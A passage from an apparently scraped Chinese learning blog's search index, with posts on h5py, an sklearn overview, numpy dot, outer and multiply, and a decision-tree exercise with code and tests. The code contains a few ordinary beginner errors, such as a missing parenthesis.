f=h5py.File(\"myh5py.hdf5\", \"w\") # w 写，r读 # deset1是数据集的name，（20,）代表数据集的shape，i代表的是数据集的元素类型 d1=f.create_dataset(\"dset1\", (20,), 'i') for key in f.keys(): print(key) print(f[key].name) print(f[key].shape) print(f[key][:]) 赋值： # 赋值 d1[...]=np.arange(20) # 或者我们可以直接按照下面的方式创建数据集并赋值 f[\"dset2\"]=np.arange(15) 如果我们有现成的numpy数组，那么可以在创建数据集的时候就赋值，这个时候就不必指定数据的类型和形状了，只需要把数组名传给参数data:d1=f.create_dataset(\"dset1\",data=a) ","date":"2022-07-16","objectID":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/:3:0","tags":["h5py","python库"],"title":"h5py库初学","uri":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/"},{"categories":["Python"],"content":"创建group import h5py import numpy as np f=h5py.File(\"myh5py.hdf5\",\"w\") # 创建一个名字为group1的组 g1=f.create_group(\"group1\") # 在b这个组里面分别创建name为dset1,dset2的数据集并赋值。 g1[\"dset1\"]=np.arange(10) g1[\"dset2\"]=np.arange(12).reshape((3,4)) for key in g1.keys(): print(g1[key].name) print(g1[key][:]) 查看结构： import h5py import numpy as np f = h5py.File(\"myh5py.hdf5\",\"w\") # 创建名字为group1,group2的组 g1 = f.create_group(\"group1\") g2 = f.create_group(\"group2\") # 创建数据集dst dst = f.create_dataset('dst', data=np.random.normal(2, 1, 10)) # 在group1组里面创建一个组car1和一个数据集dset1。 c1 = g1.create_group(\"car1\") d1 = g1.create_dataset(\"dset1\" , data=np.arange(10)) # 根目录下的组和数据集 print(\".............\") for key in f.keys(): print(f[key].name) # group11这个组下面的组和数据集 print(\".............\") for key in g1.keys(): print(g1[key].name) print(\"===\") print(c1.keys()) ","date":"2022-07-16","objectID":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/:4:0","tags":["h5py","python库"],"title":"h5py库初学","uri":"/h5py%E5%BA%93%E5%88%9D%E5%AD%A6/"},{"categories":["AI"],"content":" 只对该包做一个简单的介绍和使用方法的查找，具体可以查看官方文档，使用的时候查找即可 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:0:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"简介 scikit-learn sklearn是一个Python第三方提供的非常强力的机器学习库，它包含了从数据预处理到训练模型的各个方面。在实战使用scikit-learn中可以极大的节省我们编写代码的时间以及减少我们的代码量，使我们有更多的精力去分析数据分布，调整模型和修改超参。不过sklearn主要应用是传统的机器学习，并且其在数据量较小的情况下非常适用。 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:1:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"概括 sklearn拥有可以用于监督和无监督学习的方法，一般来说监督学习使用的更多。sklearn中的大部分函数可以归为估计器(Estimator)和 转化器(Transformer)两类。 估计器(Estimator)其实就是模型，它用于对数据的预测或回归。基本上估计器都会有以下几个方法： fit(x,y):传入数据以及标签即可训练模型，训练的时间和参数设置，数据集大小以及数据本身的特点有关 score(x,y):用于对模型的正确率进行评分(范围0-1)。但由于对在不同的问题下，评判模型优劣的的标准不限于简单的正确率，可能还包括召回率或者是查准率等其他的指标，特别是对于类别失衡的样本，准确率并不能很好的评估模型的优劣，因此在对模型进行评估时，不要轻易的被score的得分蒙蔽。 predict(x):用于对数据的预测，它接受输入，并输出预测标签，输出的格式为numpy数组。我们通常使用这个方法返回测试的结果，再将这个结果用于评估模型。 转化器(Transformer)用于对数据的处理，例如标准化、降维以及特征选择等等。同与估计器的使用方法类似: fit(x,y) :该方法接受输入和标签，计算出数据变换的方式。 transform(x) :根据已经计算出的变换方式，返回对输入数据x变换后的结果（不改变x） fit_transform(x,y) :该方法在计算出数据变换方式之后对输入x就地转换。 以上仅仅是简单的概括sklearn的函数的一些特点。 sklearn绝大部分的函数的基本用法大概如此。但是不同的估计器会有自己不同的属性，例如随机森林会有Feature_importance来对衡量特征的重要性，而逻辑回归有coef_存放回归系数intercept_则存放截距等等。并且对于机器学习来说模型的好坏不仅取决于你选择的是哪种模型，很大程度上与你超参的设置有关。因此使用sklearn的时候一定要去看看官方文档，以便对超参进行调整。 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:2:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"官方文档 地址：https://scikit-learn.org/stable/ 结构： tutorials：是一个官方教程，可以理解快速上手教程，但是看完感觉并没有很快。 user guide(用户指南）：这里对每一个算法有详细的介绍 API：这里是库调用的方法 FAQ：常见问题 总结: 一般的做法是API里面找到你要调用的方法，然后可以查看方法参数的情况和使用情况。也可以在指南里面找到具体的解释。 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:3:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"库描述 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:4:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"结构 可以看到库的算法主要有四类：分类，回归，聚类，降维。其中： 常用的回归：线性、决策树、SVM、KNN ；集成回归：随机森林、Adaboost、GradientBoosting、Bagging、ExtraTrees 常用的分类：线性、决策树、SVM、KNN，朴素贝叶斯；集成分类：随机森林、Adaboost、GradientBoosting、Bagging、ExtraTrees 常用聚类：k均值（K-means）、层次聚类（Hierarchical clustering）、DBSCAN 常用降维：LinearDiscriminantAnalysis、PCA ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:4:1","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"常用模块 样本数据集 sklearn为初学者提供了一些经典数据集，通过这些数据集可快速搭建机器学习任务、对比模型性能。数据集主要围绕分类和回归两类经典任务，对于不同需求，常用数据集简介如下： from sklearn import datasets from sklearn.linear_model import LinearRegression import matplotlib.pyplot as plt #使用以后的数据集进行线性回归（这里是波士顿房价数据） loaded_data=datasets.load_boston() data_X=loaded_data.data data_y=loaded_data.target model=LinearRegression() model.fit(data_X,data_y) print(model.predict(data_X[:4,:])) print(data_y[:4]) #使用生成线性回归的数据集，最后的数据集结果用散点图表示 X,y=datasets.make_regression(n_samples=100,n_features=1,n_targets=1,noise=10) #n_samples表示样本数目，n_features特征的数目 n_tragets noise噪音 plt.scatter(X,y) plt.show() 还可以自己加载自己的数据 数据预处理 数据预处理包括：降维、数据归一化、特征提取和特征转换（one-hot）等，这在sklearn里面有很多方法，具体查看api。 MinMaxScaler：归一化去量纲处理，适用于数据有明显的上下限，不会存在严重的异常值，例如考试得分0-100之间的数据可首选归一化处理 StandardScaler：标准化去量纲处理，适用于可能存在极大或极小的异常值，此时用MinMaxScaler时，可能因单个异常点而将其他数值变换的过于集中，而用标准正态分布去量纲则可有效避免这一问题 Binarizer：二值化处理，适用于将连续变量离散化 OneHotEncoder：独热编码，一种经典的编码方式，适用于离散标签间不存在明确的大小相对关系时。例如对于民族特征进行编码时，若将其编码为0-55的数值，则对于以距离作为度量的模型则意味着民族之间存在\"大小\"和\"远近\"关系，而用独热编码则将每个民族转换为一个由1个\"1\"和55个\"0\"组成的向量。弊端就是当分类标签过多时，容易带来维度灾难，而特征又过于稀疏 Ordinary：数值编码，适用于某些标签编码为数值后不影响模型理解和训练时。例如，当民族为待分类标签时，则可将其简单编码为0-55之间的数字 这里用归一化（preprocessing.scale() ）例子： from sklearn import preprocessing #进行标准化数据时，需要引入个包 import numpy as np from sklearn.cross_validation import train_test_split from sklearn.datasets.samples_generator import make_classification from sklearn.svm import SVC import matplotlib.pyplot as plt X,y=make_classification(n_samples=300,n_features=2,n_redundant=0,n_informative=2,random_state=22,n_clusters_per_class=1,scale=100) #X=preprocessing.minmax_scale(X,feature_range=(-1,1)) X=preprocessing.scale(X) #0.966666666667 没有 0.477777777778 X_train,X_test,y_train,y_test=train_test_split(X,y,test_size=0.3) clf=SVC() clf.fit(X_train,y_train) print(clf.score(X_test,y_test)) plt.scatter(X[:,0],X[:,1],c=y) plt.show() a=np.array([[10,2.7,3.6], [-100,5,-2], [120,20,40]],dtype=np.float64) #每一列代表一个属性 print(a)#标准化之前a　print(preprocessing.scale(a))#标准化之后的a　特征选择 模型选择 模型选择是机器学习中的重要环节，涉及到的操作包括数据集切分、参数调整和验证等。对应常用函数包括： train_test_split：常用操作之一，切分数据集和测试集，可设置切分比例 cross_val_score：交叉验证，默认K=5折，相当于把数据集平均切分为5份，并逐一选择其中一份作为测试集、其余作为训练集进行训练及评分，最后返回K个评分 GridSearchCV：调参常用方法，通过字典类型设置一组候选参数，并制定度量标准，最后返回评分最高的参数 from sklearn import datasets from sklearn.linear_model import LinearRegression import matplotlib.pyplot as plt #使用以后的数据集进行线性回归 loaded_data=datasets.load_boston() data_X=loaded_data.data data_y=loaded_data.target model=LinearRegression() model.fit(data_X,data_y) print(model.predict(data_X[:4,:])) print(data_y[:4]) #参数 print(model.coef_) #如果y=0.1x+0.3 则此行输出的结果为0.1 print(model.intercept_) #此行输出的结果为0.3 print(model.get_params()) #模型定义时定义的参数，如果没有定义则返回默认值 print(model.score(data_X,data_y)) #给训练模型打分，注意用在LinearR中使用R^2 conefficient of determination打分 度量参数 降维 降维也属于无监督学习的一种，当特征维度过多时可通过矩阵的QR分解实现在尽可能保留原有信息的情况下降低维度，一般用于图像数据预处理，且降维后的特征与原特征没有直接联系，使得模型训练不再具有可解释性。 聚类 聚类是一种典型的无监督学习任务，但也是实际应用中较为常见的需求。在不提供样本真实标签的情况下，基于某些特征对样本进行物以类聚。根据聚类的原理，主要包括三种： 基于距离聚类，典型的就是K均值聚类，通过不断迭代和重新寻找最小距离，对所有样本划分为K个簇，有一款小游戏《拥挤城市》应该就是基于K均值聚类实现 基于密度聚类，与距离聚类不同，基于密度聚类的思想是源于通过距离判断样本是否连通（需指定连通距离的阈值），从而完成样本划分。由于划分结果仅取决于连通距离的阈值，所以不可指定聚类的簇数。典型算法模型是DBSCAN 基于层次聚类，具体又可细分为自顶向下和自底向上，以自底向上层次聚类为例：首先将所有样本划分为一类，此时聚类簇数K=样本个数N，遍历寻找K个簇间最相近的两个簇并完成合并，此时还有K-1个簇，如此循环直至划分为指定的聚类簇数。当然，这里评价最相近的两个簇的标准又可细分为最小距离、最大距离和平均距离。 基本学习模型 集成学习模型 当基本学习模型性能难以满足需求时，集成学习便应运而生。集成学习，顾名思义，就是将多个基学习器的结果集成起来汇聚出最终结果。而根据汇聚的过程，集成学习主要包括3种流派： bagging，即bootstrap aggregating，通过自助取样（有放回取样）实现并行训练多个差异化的基学习器，虽然每个学习器效果可能并不突出，但通过最后投票得到的最终结果性能却会稳步提升。当基学习器采取决策树时，bagging思想的集成学习模型就是随机森林。另外，与bagging对应的另一种方式是无放回取样，相应的方法叫pasting，不过应用较少 boosting，即提升法。与bagging模型并行独立训练多个基学习器不同，boosting的思想是基于前面训练结果逐渐训练更好的模型，属于串行的模式。根据实现细节不同，又具体分为两种boosting模型，分别是Adaboost和GBDT，二者的核心思想差异在于前者的提升聚焦于之前分错的样本、而后者的提升聚焦于之前漏学的残差。另外一个大热的XGBoost是对GBDT的一个改进，实质思想是一致的。 stacking，即堆栈法，基本流程与bagging类似而又不同：stacking也是并行独立训练多个基学习器，而后又将这些训练的结果作为特征进行再次学习。有些类似于深度学习中的多层神经网络。 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:4:2","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["AI"],"content":"参考 https://zhuanlan.zhihu.com/p/33420189 https://blog.csdn.net/u014248127/article/details/78885180 https://blog.csdn.net/weixin_41395763/article/details/122949178 ","date":"2022-07-16","objectID":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/:5:0","tags":["sklearn","机器学习"],"title":"sklearn包简介","uri":"/sklearn%E5%8C%85%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":" 这几天看吴恩达深度学习作业时候，遇到了np.dot()、np.outer()、np.multiply()、*几个函数，记录一下 ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:0:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"np.dot ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:1:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"1.如果处理的是一维数组，则得到的是两数组的內积(对应位置的元素相乘再相加) 参数的顺序不会影响结果 import numpy as np x1 = [9, 2, 5, 0, 0, 7, 5, 0, 0, 0, 9, 2, 5, 0, 0] x2 = [9, 2, 2, 9, 0, 9, 2, 5, 0, 0, 9, 2, 5, 0, 0] result = np.dot(x1, x2) print(result) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:1:1","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"2.如果是二维数组（矩阵）之间的运算，则得到的是矩阵积（等同于矩阵乘法） 可以使用np.matmul 或者 a @ b 得到相同的答案 参数位置的不同会改变结果 注意：第一个矩阵的列和第二个矩阵的行的数字显得更才能计算 import numpy as np x1 = [9, 2, 5, 0, 0, 7, 5, 0, 0, 0, 9, 2, 5, 0, 0] x2 = [9, 2, 2, 9, 0, 9, 2, 5, 0, 0, 9, 2, 5, 0, 0] a = np.array(x1).reshape(3, 5) b = np.array(x2).reshape(5,3) print(a) print(b) result = np.dot(a, b) # a.dot(b) 与 np.dot(a,b)效果相同 print(result) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:1:2","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"3.如果 a 或者 b 中有一个是标量的，效果等价于np.multiply ，可以使用 multiply(a,b) 或者 a * b 也可以 参数位置不会改变答案 使用multiply或者 * 也可以 import numpy as np # 2-D array: 2 x 3 a = np.array([[1, 2, 3], [4, 5, 6]]) # 标量 b = 3 result_ab = np.dot(a, b) print(result_ab) multiply_result_ab = np.multiply(a, b) print(multiply_result_ab) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:1:3","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"np.outer 表示的是两个向量相乘，拿第一个向量的元素分别与第二个向量所有元素相乘得到结果的一行 ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:2:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"1.数组 import numpy as np a = np.arange(0,9) b = a[::-1] result = np.outer(a,b) print(result) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:2:1","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"2.矩阵 import numpy as np a = np.arange(1,5).reshape(2,2) b = np.arange(0,4).reshape(2,2) np.outer(a,b) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:2:2","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"np.multiply 表示的是数组和矩阵对应位置相乘，输出和输出的结果shape一致 ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:3:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"1.数组 import numpy as np a = np.arange(0,9) b = a[::-1] result = np.multiply(a,b) print(result) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:3:1","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"2.矩阵 import numpy as np a = np.arange(1,5).reshape(2,2) b = np.arange(0,4).reshape(2,2) print(np.multiply(a,b)) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:3:2","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"* ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:4:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"1.对数组执行的是对应位置相乘 import numpy as np a = np.arange(0,9) b = a[::-1] print(a*b) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:4:1","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"2.对矩阵执行的是矩阵相乘 import numpy as np a = np.arange(1,5).reshape(2,2) b = np.arange(0,4).reshape(2,2) print(a * b) ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:4:2","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"Note 对于array对象，*和np.multiply函数代表的是数量积，如果希望使用矩阵的乘法规则，则应该调用np.dot和np.matmul函数。 对于matrix对象，*直接代表了原生的矩阵乘法，而如果特殊情况下需要使用数量积，则应该使用np.multiply函数。 比较两幅图的不同： ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:5:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["Python"],"content":"题外话 另外，遇到了一个求范数的函数：np.linalg.norm np.linalg.norm就是元素平方求和之后开根号 函数的参数： 默认参数ord=None，axis=None，keepdims=False ","date":"2022-07-16","objectID":"/np-dot-np-outer-np-multiply/:6:0","tags":["Numpy","Python基础"],"title":"np.dot()、np.outer()、np.multiply()","uri":"/np-dot-np-outer-np-multiply/"},{"categories":["AI"],"content":"问题陈述 问题陈述： Suppose you are starting a company that grows and sells wild mushrooms. Since not all mushrooms are edible, you’d like to be able to tell whether a given mushroom is edible or poisonous based on it’s physical attributes You have some existing data that you can use for this task. Can you use the data to help you identify which mushrooms can be sold safely? Note: The dataset used is for illustrative purposes only. It is not meant to be a guide on identifying edible mushrooms. You have 10 examples of mushrooms. For each example, you have Three features Cap Color (Brown or Red), Stalk Shape (Tapering or Enlarging), and Solitary (Yes or No) Label Edible (1 indicating yes or 0 indicating poisonous) 回顾建立决策树的步骤： 1.Start with all examples at the root node 2.Calculate information gain for splitting on all possible features, and pick the one with the highest information gain 3.Split dataset according to the selected feature, and create left and right branches of the tree 4.Keep repeating splitting process until stopping criteria is met ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:1:0","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"建立决策树 ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:0","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"示例数据 X_train = np.array( [[1, 1, 1], [1, 0, 1], [1, 0, 0], [1, 0, 0], [1, 1, 1], [0, 1, 1], [0, 0, 0], [1, 0, 1], [0, 1, 0], [1, 0, 0]]) y_train = np.array([1, 1, 0, 0, 1, 0, 0, 1, 1, 0]) # cat_data() def cat_data(): print(\"First few elements of X_train:\\n\", X_train[:3]) print(\"Type of X_train:\", type(X_train)) print(\"First few elements of y_train:\", y_train[:3]) print(\"Type of y_train:\", type(y_train)) print('The shape of X_train is:', X_train.shape) print('The dim of X_train is:', X_train.ndim) print('The shape of y_train is: ', y_train.shape) print('The dim of y_train is: ', y_train.ndim) print('Number of training examples (m):', len(X_train)) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:1","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"计算熵 def compute_entropy(y): \"\"\" Computes the entropy for Args: y (ndarray): Numpy array indicating whether each example at a node is edible (`1`) or poisonous (`0`) Returns: entropy (float): Entropy at that node \"\"\" # You need to return the following variables correctly entropy = 0. ### START CODE HERE ### if len(y) != 0: # Your code here to calculate the fraction of edible examples (i.e with value = 1 in y) p1 = len(y[y == 1]) / len(y) # For p1 = 0 and 1, set the entropy to 0 (to handle 0log0) if p1 != 0 and p1 != 1: # Your code here to calculate the entropy using the formula provided above entropy = -p1 * np.log2(p1) - (1 - p1) * np.log2(1 - p1) else: entropy = 0. ### END CODE HERE ### return entropy print(\"Entropy at root node: \", compute_entropy(y_train)) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:2","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"Split the dataset def split_dataset(X, node_indices, feature): \"\"\" Splits the data at the given node into left and right branches Args: X (ndarray): Data matrix of shape(n_samples, n_features) node_indices (ndarray): List containing the active indices. I.e, the samples being considered at this step. feature (int): Index of feature to split on Returns: left_indices (ndarray): Indices with feature value == 1 right_indices (ndarray): Indices with feature value == 0 \"\"\" # You need to return the following variables correctly left_indices = [] right_indices = [] ### START CODE HERE ### for i in node_indices: if X[i][feature] == 1: # Your code here to check if the value of X at that index for the feature is 1 left_indices.append(i) else: right_indices.append(i) ### END CODE HERE ### return left_indices, right_indices root_indices = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9] # Feel free to play around with these variables # The dataset only has three features, so this value can be 0 (Brown Cap), 1 (Tapering Stalk Shape) or 2 (Solitary) feature = 0 left_indices, right_indices = split_dataset(X_train, root_indices, feature) print(\"Left indices: \", left_indices) print(\"Right indices: \", right_indices) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:3","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"计算信息增益 # UNQ_C3 # GRADED FUNCTION: compute_information_gain def compute_information_gain(X, y, node_indices, feature): \"\"\" Compute the information of splitting the node on a given feature Args: X (ndarray): Data matrix of shape(n_samples, n_features) y (array like): list or ndarray with n_samples containing the target variable node_indices (ndarray): List containing the active indices. I.e, the samples being considered in this step. Returns: cost (float): Cost computed \"\"\" # Split dataset left_indices, right_indices = split_dataset(X, node_indices, feature) # Some useful variables X_node, y_node = X[node_indices], y[node_indices] X_left, y_left = X[left_indices], y[left_indices] X_right, y_right = X[right_indices], y[right_indices] # You need to return the following variables correctly information_gain = 0 ### START CODE HERE ### # Your code here to compute the entropy at the node using compute_entropy() node_entropy = compute_entropy(y_node) left_entropy = compute_entropy(y_left) right_entropy = compute_entropy(y_right # Your code here to compute the proportion of examples at the left branch w_left = len(X_left) / len(X_node) w_right = len(X_right) / len(X_node) # Your code here to compute weighted entropy from the split using # w_left, w_right, left_entropy and right_entropy weighted_entropy = w_left * left_entropy + w_right * right_entropy # Your code here to compute the information gain as the entropy at the node # minus the weighted entropy information_gain = node_entropy - weighted_entropy ### END CODE HERE ### return information_gain info_gain0 = compute_information_gain(X_train, y_train, root_indices, feature=0) print(\"Information Gain from splitting the root on brown cap: \", info_gain0) info_gain1 = compute_information_gain(X_train, y_train, root_indices, feature=1) print(\"Information Gain from splitting the root on tapering stalk shape: \", info_gain1) info_gain2 = compute_information_gain(X_train, y_train, root_indices, feature=2) print(\"Information Gain from splitting the root on solitary: \", info_gain2) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:4","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"Get best split # UNQ_C4 # GRADED FUNCTION: get_best_split def get_best_split(X, y, node_indices): \"\"\" Returns the optimal feature and threshold value to split the node data Args: X (ndarray): Data matrix of shape(n_samples, n_features) y (array like): list or ndarray with n_samples containing the target variable node_indices (ndarray): List containing the active indices. I.e, the samples being considered in this step. Returns: best_feature (int): The index of the best feature to split \"\"\" # Some useful variables num_features = X.shape[1] # You need to return the following variables correctly best_feature = -1 ### START CODE HERE ### max_info_gain = 0 # Iterate through all features for feature in range(num_features): # Your code here to compute the information gain from splitting on this feature info_gain = compute_information_gain(X, y, node_indices, feature) # If the information gain is larger than the max seen so far if info_gain \u003e max_info_gain: # Your code here to set the max_info_gain and best_feature max_info_gain = info_gain best_feature = feature ### END CODE HERE ## return best_feature best_feature = get_best_split(X_train, y_train, root_indices) print(\"Best feature to split on: %d\" % best_feature) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:5","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"Building the tree # Not graded tree = [] def build_tree_recursive(X, y, node_indices, branch_name, max_depth, current_depth): \"\"\" Build a tree using the recursive algorithm that split the dataset into 2 subgroups at each node. This function just prints the tree. Args: X (ndarray): Data matrix of shape(n_samples, n_features) y (array like): list or ndarray with n_samples containing the target variable node_indices (ndarray): List containing the active indices. I.e, the samples being considered in this step. branch_name (string): Name of the branch. ['Root', 'Left', 'Right'] max_depth (int): Max depth of the resulting tree. current_depth (int): Current depth. Parameter used during recursive call. \"\"\" # Maximum depth reached - stop splitting if current_depth == max_depth: formatting = \" \"*current_depth + \"-\"*current_depth print(formatting, \"%s leaf node with indices\" % branch_name, node_indices) return # Otherwise, get best split and split the data # Get the best feature and threshold at this node best_feature = get_best_split(X, y, node_indices) tree.append((current_depth, branch_name, best_feature, node_indices)) formatting = \"-\"*current_depth print(\"%s Depth %d, %s: Split on feature: %d\" % (formatting, current_depth, branch_name, best_feature)) # Split the dataset at the best feature left_indices, right_indices = split_dataset(X, node_indices, best_feature) # continue splitting the left and the right child. Increment current depth build_tree_recursive(X, y, left_indices, \"Left\", max_depth, current_depth+1) build_tree_recursive(X, y, right_indices, \"Right\", max_depth, current_depth+1) build_tree_recursive(X_train, y_train, root_indices, \"Root\", max_depth=2, current_depth=0) ","date":"2022-07-12","objectID":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/:2:6","tags":["决策树","深度学习入门","机器学习","Decision Tree"],"title":"初学决策树","uri":"/%E5%88%9D%E5%AD%A6%E5%86%B3%E7%AD%96%E6%A0%91/"},{"categories":["AI"],"content":"code \"\"\" 问题陈述： Suppose you are starting a company that grows and sells wild mushrooms. Since not all mushrooms are edible, you'd like to be able to tell whether a given mushroom is edible or poisonous based on it's physical attributes You have some existing data that you can use for this task. Can you use the data to help you identify which mushrooms can be sold safely? Note: The dataset used is for illustrative purposes only. It is not meant to be a guide on identifying edible mushrooms. You have 10 examples of mushrooms. For each example, you have - Three features - Cap Color (Brown or Red), - Stalk Shape (Tapering or Enlarging), and - Solitary (Yes or No) - Label - Edible (1 indicating yes or 0 indicating poisonous) 回顾建立决策树的步骤： 1.Start with all examples at the root node 2.Calculate information gain for splitting on all possible features, and pick the one with the highest information gain 3.Split dataset according to the selected feature, and create left and right branches of the tree 4.Keep repeating splitting process until stopping criteria is met \"\"\" import numpy as np import matplotlib.pyplot as plt def compute_entropy_test(target): y = np.array([1] * 10) result = target(y) assert result == 0, \"Entropy must be 0 with array of ones\" y = np.array([0] * 10) result = target(y) assert result == 0, \"Entropy must be 0 with array of zeros\" y = np.array([0] * 12 + [1] * 12) result = target(y) assert result == 1, \"Entropy must be 1 with same ammount of ones and zeros\" y = np.array([1, 0, 1, 0, 1, 1, 1, 0, 1]) assert np.isclose(target(y), 0.918295, atol=1e-6), \"Wrong value. Something between 0 and 1\" assert np.isclose(target(-y + 1), target(y), atol=1e-6), \"Wrong value\" print(\"\\033[92m All tests passed.\") def split_dataset_test(target): X = np.array([[1, 0], [1, 0], [1, 1], [0, 0], [0, 1]]) X_t = np.array([[0, 1, 0, 1, 0]]) X = 